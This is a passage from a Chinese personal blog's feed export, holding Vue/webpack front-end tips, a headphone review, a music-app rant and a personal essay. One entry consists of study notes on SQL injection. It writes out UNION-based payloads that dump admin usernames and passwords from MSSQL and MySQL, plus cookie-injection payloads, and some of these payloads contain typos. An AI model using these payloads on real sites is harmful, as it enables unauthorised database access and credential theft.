class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// actions.js</span></span><br><span class="line"><span class="comment">// 父组件调用这个action</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> getData = <span class="function">(<span class="params">&#123; dispatch &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">    Vue.http.get(url, &#123; req: <span class="string">'req body'</span> &#125;).then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 正常返回, 别忘了处理错误</span></span><br><span class="line">        dispatch(REFRESH_DATA, res.data)</span><br><span class="line">    &#125;, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        alert(err.message)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ........</span></span><br><span class="line"><span class="comment">// store.js</span></span><br><span class="line"><span class="keyword">const</span> state = &#123;</span><br><span class="line">    data: <span class="literal">null</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> mutations = &#123;</span><br><span class="line">    [REFRESH_DATA] (state, data) &#123;</span><br><span class="line">        state.data = data</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 各个需要更新数据的子控件.vue</span></span><br><span class="line"><span class="comment">// ....</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="comment">// ....</span></span><br><span class="line">    vuex: &#123;</span><br><span class="line">        getters: &#123;</span><br><span class="line">            data: <span class="function">(<span class="params">&#123; data &#125;</span>) =&gt;</span> data</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// .....</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ....</span></span><br></pre></td></tr></table></figure></p><p><a href="http://www.doc00.com/doc/1001004eg" target="_blank" rel="noopener">详情看这里</a></p><h2 id="记得把-externals-写在-webpack-config-js-里面啊"><a href="#记得把-externals-写在-webpack-config-js-里面啊" class="headerlink" title="记得把 externals 写在 webpack.config.js 里面啊"></a>记得把 externals 写在 webpack.config.js 里面啊</h2><p>傻乎乎的在<code>index.html</code>中单独引入了cdn的jquery，忘了往webpack里面配置。结果打包出来一百多kb，是说那么慢。<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">externals:</span> &#123;</span><br><span class="line"><span class="string">'jquery'</span>: <span class="string">'jQuery'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>再打包就只有三十多kb了，而且这里面还包括<code>vue-touch</code>的<code>hammer.js</code>，这个不知道怎么单独写出来了，等下去问问。</p><h2 id="在android-ios中使用vue"><a href="#在android-ios中使用vue" class="headerlink" title="在android/ios中使用vue"></a>在android/ios中使用vue</h2><p>aka 暴露全局变量给webview回调<br>改了几个版本，还有个<a href="https://github.com/webpack/docs/wiki/shimming-modules" target="_blank" rel="noopener">shim挂载至全局的办法</a>，我还没有看。</p><p>下面是直接暴露的方法<br>在exposed.vue中：<br><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span></span><br><span class="line"><span class="xml">var ex</span></span><br><span class="line"><span class="xml">...</span></span><br><span class="line"><span class="xml">export default </span><span class="template-variable">&#123;</span></span><br><span class="line"><span class="template-variable">methods: &#123;</span></span><br><span class="line"><span class="template-variable">setSth(tag, score) &#123;</span></span><br><span class="line"><span class="template-variable">this.list[tag] = score</span></span><br><span class="line"><span class="template-variable">&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">&#125;,</span></span><br><span class="line"><span class="xml">ready() </span><span class="template-variable">&#123;</span></span><br><span class="line"><span class="template-variable">ex = this</span></span><br><span class="line"><span class="template-variable">&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">...</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"><span class="xml">exoport </span><span class="template-variable">&#123; ex &#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>然后在顶层 main.js 中：// 注意这里并不是window，我在这里卡了一会儿还。<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> exposed <span class="keyword">from</span> <span class="string">'path_to/exposed.vue'</span> <span class="comment">// 暴露ex</span></span><br><span class="line"><span class="keyword">import</span> default <span class="keyword">from</span> <span class="string">'path_to/exposed.vue'</span> <span class="comment">// 暴露setSth()</span></span><br><span class="line">...</span><br><span class="line">exposed = ex <span class="comment">// 绑定至事先定义好的全局变量</span></span><br></pre></td></tr></table></figure></p><p>全局下面，index.html:<br><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span></span><br><span class="line"><span class="xml">    var exposed = </span><span class="template-variable">&#123;&#125;</span><span class="xml"> // 在build.js之前定义一个全局变量</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"build.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">// 使用</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span></span><br><span class="line"><span class="xml">    exposed.methods.setSth(0, 1)</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><h2 id="使用vuex"><a href="#使用vuex" class="headerlink" title="使用vuex"></a>使用vuex</h2><p>没有vuex的时候使用<code>$dispatch()</code>和<code>$broadcast()</code>。<br>有vuex的时候dispatch：<br>action.vue<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> store from <span class="string">'store.js'</span></span><br><span class="line">exports <span class="keyword">default</span> &#123;</span><br><span class="line">methods: &#123;</span><br><span class="line">act(info) &#123;</span><br><span class="line">store.dispatch(<span class="string">'action'</span>, info)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>store.js:<br><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import Vuex <span class="keyword">from</span> 'vuex'</span><br><span class="line">const <span class="keyword">state</span> = &#123;</span><br><span class="line">a: <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">const mutations = &#123;</span><br><span class="line">action(<span class="keyword">state</span>, info) &#123;</span><br><span class="line"><span class="keyword">state</span>.a = <span class="number">0</span></span><br><span class="line">console.<span class="keyword">log</span>(info)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">export <span class="keyword">default</span> new Vuex.Store(&#123;</span><br><span class="line"><span class="keyword">state</span>,</span><br><span class="line">mutations</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>有vuex的时候broadcast：<br>action.vue<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> store from <span class="string">'store.js'</span></span><br><span class="line">exports <span class="keyword">default</span> &#123;</span><br><span class="line">methods: &#123;</span><br><span class="line">do() &#123;console.log(<span class="string">'done'</span>)&#125;</span><br><span class="line">&#125;,</span><br><span class="line">watch: &#123;</span><br><span class="line"><span class="string">'store.state.a'</span>: <span class="string">'do'</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>store.js:<br><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import Vuex <span class="keyword">from</span> 'vuex'</span><br><span class="line">const <span class="keyword">state</span> = &#123;</span><br><span class="line">a: <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">const mutations = &#123;&#125;</span><br><span class="line">export <span class="keyword">default</span> new Vuex.Store(&#123;</span><br><span class="line"><span class="keyword">state</span>,</span><br><span class="line">mutations</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h2 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h2><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="name">function</span>() &#123;</span><br><span class="line">  animation.translate(<span class="number">30</span>).step()</span><br><span class="line">  this.setData(&#123;</span><br><span class="line">    animationData<span class="symbol">:animation</span>.export()</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;.bind(<span class="name">this</span>), <span class="number">1000</span>)</span><br></pre></td></tr></table></figure><p>在es5中就可以使用<code>.bind(this)</code>了</p><h2 id="再也不用css-filter了"><a href="#再也不用css-filter了" class="headerlink" title="再也不用css:filter了"></a>再也不用css:filter了</h2><p>在安卓上就跟屎一样</p><h2 id="proxychains-ng"><a href="#proxychains-ng" class="headerlink" title="proxychains-ng"></a>proxychains-ng</h2><p>proxychains 是给命令行使用代理的工具，支持 socks5.</p><p><code>$ brew install proxychains-ng</code></p><h2 id="微信小程序"><a href="#微信小程序" class="headerlink" title="微信小程序"></a>微信小程序</h2><p>打开的时候不要开代理，不然有<code>net::ERR_NAME_NOT_RESOLVED</code>问题<br>wxml 要用 <code>&lt;image&gt;&lt;/image&gt;</code>标签而不是<code>&lt;img&gt;&lt;/img&gt;</code><br>wxss 不支持<code>transform</code>，不支持<code>animation</code>的<code>@keyframes</code>，反而使用<a href="https://mp.weixin.qq.com/debug/wxadoc/dev/api/api-animation.html" target="_blank" rel="noopener">wx.createAnimation(OBJECT)</a>，自己的api，这个好处在哪里？<br>（待确定）wxss <code>background-size</code> 的渲染有问题？</p><h2 id="git-push-每次都要输入密码？"><a href="#git-push-每次都要输入密码？" class="headerlink" title="git push 每次都要输入密码？"></a>git push 每次都要输入密码？</h2><p><code>git remote -v</code><br>看到<code>fetch</code>和<code>push</code>的开头都是<code>https</code><br>没有走<code>ssh</code>，要先加上<code>ssh-key</code>，再换成<code>ssh</code>的方式<br>记得先在github的sshkey设置里面加上本机的sshkey<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git remote rm origin</span><br><span class="line">git remote add origin git@github<span class="selector-class">.com</span>:mugbya/arch_config.git</span><br><span class="line">git push origin</span><br></pre></td></tr></table></figure></p><h2 id="伪元素和伪类"><a href="#伪元素和伪类" class="headerlink" title="伪元素和伪类"></a>伪元素和伪类</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">:first-letter</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">p</span> &gt; <span class="selector-tag">span</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: blue<span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>第一个<span class="tag">&lt;/<span class="name">span</span>&gt;</span>字符看看会不会变红？<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>第一个字符是红色，因为<code>::first-letter</code>伪元素是作为子元素存在的。</p><h2 id="放假是用新东西的时候"><a href="#放假是用新东西的时候" class="headerlink" title="放假是用新东西的时候"></a>放假是用新东西的时候</h2><p>新鞋子，新衣服</p><h2 id="mac"><a href="#mac" class="headerlink" title="mac"></a>mac</h2><p><code>command</code> + <code>option</code> + <code>esc</code></p><h2 id="js小数点保留2位"><a href="#js小数点保留2位" class="headerlink" title="js小数点保留2位"></a>js小数点保留2位</h2><p>num.toFixed(2)</p><h2 id="数据异步更新的问题"><a href="#数据异步更新的问题" class="headerlink" title="数据异步更新的问题"></a>数据异步更新的问题</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">'html'</span>).css(<span class="string">'font-size'</span>, <span class="string">'1.29em'</span>)</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    $(<span class="string">'html'</span>).css(<span class="string">'font-size'</span>, <span class="string">'1.3em'</span>)</span><br><span class="line">&#125;, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><h2 id="css性能"><a href="#css性能" class="headerlink" title="css性能"></a>css性能</h2><p>will-change: transform;<br>使用3d变换</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Review of Network Attack and Defense</title>
      <link href="/2016/09-19-Network-attack-and-defense/"/>
      <url>/2016/09-19-Network-attack-and-defense/</url>
      
        <content type="html"><![CDATA[<p>SQL注入即是指攻击者通过在应用程序中预先定义好的查询语句结尾加上额外的SQL语句元素，欺骗数据库服务器执行非授权的任意查询。</p><h2 id="SQL注入基础"><a href="#SQL注入基础" class="headerlink" title="SQL注入基础"></a>SQL注入基础</h2><h3 id="1-试探-1-1，1-2"><a href="#1-试探-1-1，1-2" class="headerlink" title="1.试探 1=1，1=2"></a>1.试探 1=1，1=2</h3><ol><li><a href="http://example.asp?id=49" target="_blank" rel="noopener">http://example.asp?id=49</a></li><li><a href="http://example.asp?id=49" target="_blank" rel="noopener">http://example.asp?id=49</a> <code>and 1=1</code></li><li><a href="http://example.asp?id=49" target="_blank" rel="noopener">http://example.asp?id=49</a> <code>and 1=2</code></li></ol><p>可以注入的表现：</p><ol><li>正常显示</li><li>正常显示</li><li>提示BOF或EOF</li></ol><p>不可注入的表现：</p><ol><li>正常显示</li><li>程序定义的错误提示或提示类型转换时出错。</li><li>同上</li></ol><h3 id="2-判断数据库类型"><a href="#2-判断数据库类型" class="headerlink" title="2.判断数据库类型"></a>2.判断数据库类型</h3><h4 id="加单引号"><a href="#加单引号" class="headerlink" title="加单引号"></a>加单引号</h4><ol><li>错误提示含有JET（JET是ACCESS数据库的数据库引擎）</li><li>错误提示中含有OLEDB（OLEDB是SQL SERVER使用的数据库引擎）</li></ol><h4 id="and-user-gt-0"><a href="#and-user-gt-0" class="headerlink" title="and user &gt; 0"></a>and user &gt; 0</h4><p>SQL SERVER出错：将nvarchar值“abc”转换数据类型为int的列时发生语法错误；“abc”正是变量user的值。SQL SERVER中有一个内置变量user，变量类型为nvarchar。</p><p>ACCESS的系统表[msysobjects]在web环境下读该表会提示“没有权限”；SQL SERVER的系统表[sysobjects]在web环境下不可正常读取。</p><h4 id="and-select-count-from-sysobjects-gt-0"><a href="#and-select-count-from-sysobjects-gt-0" class="headerlink" title="and (select count (*) from sysobjects) &gt; 0"></a><code>and (select count (*) from sysobjects) &gt; 0</code></h4><p>SQL SERVER显示正常。ACCESS显示出错。</p><h4 id="and-select-count-from-msysobjects-gt-0"><a href="#and-select-count-from-msysobjects-gt-0" class="headerlink" title="and (select count (*) from msysobjects) &gt; 0"></a><code>and (select count (*) from msysobjects) &gt; 0</code></h4><p>SQL SERVER显示正常。ACCESS显示没有权限。</p><h3 id="3-猜表名"><a href="#3-猜表名" class="headerlink" title="3.猜表名"></a>3.猜表名</h3><p><code>and (select count (*) from admin) &gt;= 0</code><br>返回正常说明admin存在</p><h3 id="4-猜字段"><a href="#4-猜字段" class="headerlink" title="4.猜字段"></a>4.猜字段</h3><p><code>and (select count (content) from admin) &gt;= 0</code><br>返回正常说明content字段存在</p><p>常用的猜字段函数<br>ACCESS: asc(字符)    返回字符的ascii<br>MSSQL: unicode(字符)    同上<br>ACCESS: char(数字)    返回ascii的字符<br>MSSQL: nchar()同上<br>ACCESS: mid(字符串,N,L)    返回字符串从N个字符起，长度为L的子字符串<br>MSSQL: substring(字符串,N,L)    同上<br>ACCESS,MSSQL: abc(数字)    返回数字的绝对值（猜汉字使用）<br>ACCESS,MSSQL: A between B and C    判断A是否在B和C之间</p><p>例<code>and (select asc(mind(password,1,1))from admin) &gt; 100</code><br>查询admin中password字段第1个字符串的ascii是否大于100</p><p>例<code>select * from article where articleid = &#39;&#39; union select * from user where userid = 1</code><br>第一个select执行后返回结果<code>title</code> <code>content</code><br><code>select * from article where articleid = &#39;&#39;</code><br>第二个select执行后返回结果<code>username</code> <code>password</code><br><code>select * from user where userid = 1</code><br>整个select执行后返回结果<code>username</code> <code>password</code><br>如果前面查询为真，则同时返回两次查询的内容</p><ol><li>判断字段个数<code>order by</code></li><li>查表名<code>and (select count (*) from admin) &gt;= 0</code></li><li>猜测admin表的字段个数（假如有三个字段id,user,password）<code>union select 1,2,3,4,5,6,7,8,9,10,* from admin</code>返回错误，<code>union select 1,2,3,* from admin</code>返回正常</li></ol><p>inner join on: 指定返回两个表中匹配的行<br><code>select * from admin as a inner join admin as b on a.id = b.id</code>返回一个表中的两个内容</p><p>上方<code>3</code>中没法显示admin中所有的字段信息，扩大显示范围，构造如下语句<code>and 1=2 union select 1,2,3,* from admin as a inner join admin as b on a.id = b.id</code></p><p><code>select * from admin inner join admin1 on admin.id = admin1.id</code>返回两个表内容</p><h2 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h2><ol><li>判断字段个数<code>order by 13</code></li><li>判断字段回显位<code>and 1=2 union all select 1,2,null,4,5,6,7,8,9,10,11,null,13</code></li><li>数据库版本<code>and 1=2 union select 1,@@version,null,4,5,6,7,8,9,10,11,null,13</code></li><li>当前数据库名<code>and 1=2 union all select 1,db_name(),null,4,5,6,7,8,9,10,11,null,13</code></li><li>所有数据库名（通过更改dbid，7以上的是用户数据库）<code>and 1=2 union all select 1,name,null,4,5,6,7,8,9,10,11,null,13 from master.db0.sysdatabases where dbid = 7 --</code></li><li>表名（更改top后的数字来查询）<code>and 1=2 union all select 1,name,null,4,5,6,7,8,9,10,11,null,13 from data.db0.sysobjects where xtype = CHAER(85) and name not in (select top 1 name from data.db0.sysobjects where xtype = CHAR(85))--</code></li><li>字段对应id<code>and 1=2 union all select 1,id,null,4,5,6,7,8,9,10,11,null,13 from data.db0.sysobjects where xtype = CHAR(85) and name not in (select top 7 name from data.bd0.sysobjects where xtype = CHAR(85))--</code></li><li>根据id查字段名<code>and 1=2 union all select 1,id,null,4,5,6,7,8,9,10,11,null,13 from data.db0.syscolumns where ID = 12345 and name not in (select top 1 name from data.db0.syscolumns where ID = 12345)--</code></li></ol><h2 id="ASSESS"><a href="#ASSESS" class="headerlink" title="ASSESS"></a>ASSESS</h2><ol><li>试探<code>1=1</code> <code>1=2</code></li><li>环境监测<code>and ord(mid(version(),1,1))&gt;51</code>正常则为mysql4以上版本，可以union查询<code>union select 1,version(),3</code></li><li>确定字段数<code>order by 13</code></li><li>判断精确字段<code>and 1=2 union select 1,2,3,4</code>正常返回在页面中</li><li>爆数据库名<code>and 1=2 union select 1,user(),3,database()</code>正常返回在页面中</li><li>爆表<code>and 1=2 union select 1,TABLE_NAME,3,4 from information_schema.tables where TABLE_SCHEMA = &#39;blah&#39;</code>结果返回在2字段</li><li>爆字段<code>and 1=2 union select 1,COLUMN_NAME,3,4 from informations_chema.COLUMN where TABLE_NAME=&#39;users&#39;</code> <code>and 1=2 union select char(mid(COLUMN-NAME)),2,3,4 from information_schema.COLUMN where TABLE_NAME=&#39;users&#39;</code></li><li>爆数据<code>and 1=2 union select 1,user,3,password form phptest.users</code></li></ol><h2 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h2><ol><li>在原地址加单引号</li><li>去掉id值，页面出错，构造cookie语句：<code>javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;30 and 1=1&quot;))</code>会弹窗</li><li>关闭弹窗，去掉id访问，页面正常</li><li>猜测字段<code>javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;30 order by 5&quot;))</code>点击确认，去掉id访问，页面正常则正常</li><li>判断回显位<code>javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;30 union select 1,2,3,4 from admin&quot;))</code>点击确认，去掉id访问，页面正常则正常</li><li>猜解user password字段<code>javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;30 union select 1,user,3,4 from admin&quot;))</code></li></ol>]]></content>
      
      
      <categories>
          
          <category> Discovery </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>100aap 动耳听</title>
      <link href="/2016/09-07-100aap-hands-on/"/>
      <url>/2016/09-07-100aap-hands-on/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="260" height="86" src="http://music.163.com/outchain/player?type=2&id=27471609&auto=1&height=66"></iframe><p>听了一段时间再来评测哟~ 为信仰充值的MDR-100AAP。</p><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p><a href="http://gaoryrt.com/2016/07-31-whatsup20160731/">很早以前</a>就说要换耳机，在铁三角之后入了一款小米的圈铁，后面实在不堪智商受辱，洒水为信仰充值，入了大法的 h.ear on 系列的一款街机 —— mdr-100aap。<br><img src="/2016/07-31-whatsup20160731/cks77.jpg" alt=""><br>👆以前的主力塞子，cks系列貌似主推就是低音吧。确实低音很不错，就是没有线控。<br><img src="/2016/07-31-whatsup20160731/mi.jpg" alt=""><br>👆这个就当交智商税了。要不是有个线控，第一次听我就当场把它撕个粉cui。</p><hr><h2 id="动眼看"><a href="#动眼看" class="headerlink" title="动眼看"></a>动眼看</h2><p>渣画质，乱桌面见谅<br><img src="/2016/09-07-100aap-hands-on/hear0.jpeg" alt=""><br>👆良心就是良心，盒子都这么大。<br><img src="/2016/09-07-100aap-hands-on/hear1.jpeg" alt=""><br>👆各种参数。<br><img src="/2016/09-07-100aap-hands-on/hear2.jpeg" alt=""><br>👆盒子里面的本体，送一个绒的袋子，下面照片偏下方是附带的耳麦线，只有一个按钮，常用 earpods 的应该知道怎么用。<br><img src="/2016/09-07-100aap-hands-on/hear3.jpeg" alt=""><br>👆包耳式的耳机，但是为啥这一层是半透明的……<br><img src="/2016/09-07-100aap-hands-on/hear4.jpeg" alt=""><br>👆外观就这样，左右各有一个蚀刻信仰标。</p><hr><h2 id="动耳听"><a href="#动耳听" class="headerlink" title="动耳听"></a>动耳听</h2><p>刚上耳朵打开只有一个感觉：声场宽。<br>至少比起塞子来说，身临其境的感觉多了很多。<br>听熟悉的歌曲的时候，仔细听还能发现新感觉。<br>然后把好多古典乐翻出来听，确实比塞子爽啊……<br>带上去很舒服，刚好包裹住双耳。<br>然后貌似没有低音？<br>以前的入耳塞子给人的低音给人的感觉是「低」，而这一个低音是「后」。<br>听的少，没什么发言权，至少没有让我失望。</p><hr><p>价格嘛，德亚经常打折能降到900RMB左右。<br>总之很划得来。</p>]]></content>
      
      
      <categories>
          
          <category> Discovery </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>今天删了网易云音乐</title>
      <link href="/2016/08-22-shut-up-n-listen/"/>
      <url>/2016/08-22-shut-up-n-listen/</url>
      
        <content type="html"><![CDATA[<p>实话讲，网易云音乐的评论确实是一个亮点，但正是因为评论，我是真的对这个软件没有什么留恋了。</p><h2 id="手机上有-apple-music"><a href="#手机上有-apple-music" class="headerlink" title="手机上有 apple music"></a>手机上有 apple music</h2><p>apple music 的推荐是编者选择的，相对应的，网易云的歌单是听众自己选择的。</p><p>apple music 每个月十元，可以离线听。网易云每个月八元可以听SQ，依然不是所有歌曲都可以听。</p><p>在VPN加成速度没有差距的情况下，可能就只有评论、电台、社交功能打到了痛点。</p><p>然而我真的对这些有需求？</p><h2 id="评论、电台、再加上社交？"><a href="#评论、电台、再加上社交？" class="headerlink" title="评论、电台、再加上社交？"></a>评论、电台、再加上社交？</h2><p>因为对评论的管理并不严格，我经常能看到博取赞的评论、各种段子、对喷。我在听歌的时候真的想去看看别人对这首歌有什么意见么？想了想还是算了。</p><p>至于电台，连前进后退 15s 这种关键动作都没有，你还让我听 broadcast？ Overcast 已经在速度快慢上加上了智能缩进空白的功能（smart speed, shortens silences），而且还是免费的。</p><p>社交？ 我从来都是往外分享，就没有仔细看过这个里面的。。。「音乐圈」？</p><h2 id="评论渣在哪里"><a href="#评论渣在哪里" class="headerlink" title="评论渣在哪里"></a>评论渣在哪里</h2><p>评论区有「热评」和「普通评论」，「普通」通过大家的点赞可以常驻「热评」。</p><p>民主吧？公平吧？理论上完美吧？</p><p>然而这里也恰好是完美展示经验差的地方，人外有人，天外有天。</p><p>一开始是「看过xx来的赞我」，后来是「xx跟这个比起来就是狗」，再往后还有「喜欢xx的可以点我头像关注我」、「不上999直播吃电风扇把我顶上去」。</p><p>你直接说你人没有点赞就要死了，可能赞来的要快一点。</p><p>最近还看到一种，把一首歌里面的所有评论挨个点赞。可能是因为每个赞都可以通知到用户，这个也是一个打广告的方法。这种广告我貌似还必须收。</p><p>想看的看，不想看的也必须跟着看。微博至少不想看的你可以不关注，但是在网易云音乐的评论区你必须和所有人一起忍，付费都不行，真不公平。即使是渣浪，你付费了还是能享受到屏蔽某人的权利。</p><h2 id="嗨呀，好气啊"><a href="#嗨呀，好气啊" class="headerlink" title="嗨呀，好气啊"></a>嗨呀，好气啊</h2><p>貌似这不是第一次放弃这种「民主」了，还是「编辑选择」靠谱。<br><strong>想看的看，不想看的，就别看</strong><br>完。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔与个人文集 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>「精神病人思路广」</title>
      <link href="/2016/08-13-i-do-not-need-a-relationship/"/>
      <url>/2016/08-13-i-do-not-need-a-relationship/</url>
      
        <content type="html"><![CDATA[<p>以下所有内容均为白日呓语。</p><hr><h2 id="想太多"><a href="#想太多" class="headerlink" title="想太多"></a>想太多</h2><p>我确定我是一个膨胀自负，明知道自己不行还会硬撑面子的人。</p><p>这种人在文学作品中总是逞一时风光，到后面死的很惨，惨到让观者大呼过瘾。</p><p>另，这种人有一种自带的被动叫做「想太多」。</p><p>这种 debuff 经常让我不知不觉身处尴尬之中，事情太多、太尴尬，每每想到自己都会脸红。</p><hr><h2 id="我挺喜欢小剥皮。"><a href="#我挺喜欢小剥皮。" class="headerlink" title="我挺喜欢小剥皮。"></a>我挺喜欢小剥皮。</h2><p>想了一下，不能形容为「欢乐要建立在别人的痛苦之上」，毕竟看见某些惨状我只会恶心而不是欢乐。</p><ol><li>在同一件事上，我与他人付出了同样的努力，然而别人要比我差的时候，我会感到开心。</li><li>在同一件事上，我比他人付出了更多，别人比我差的时候，我也会开心。</li><li>若是不能比，或者我比他人差，那么就没得谈了，怎么开心得起来。</li></ol><p>小剥皮不像是乔大帝，乔大帝不努力。小剥皮会用尽手段以达到自己的目的。</p><p>『怠惰啊！』</p><p>这种欢乐来自于膨胀自负带来的优越感。优越感也带来一点负罪感，可是冥冥中有个声音告诉我我不该这么做。</p><hr><h2 id="我五年内都不会有女朋友"><a href="#我五年内都不会有女朋友" class="headerlink" 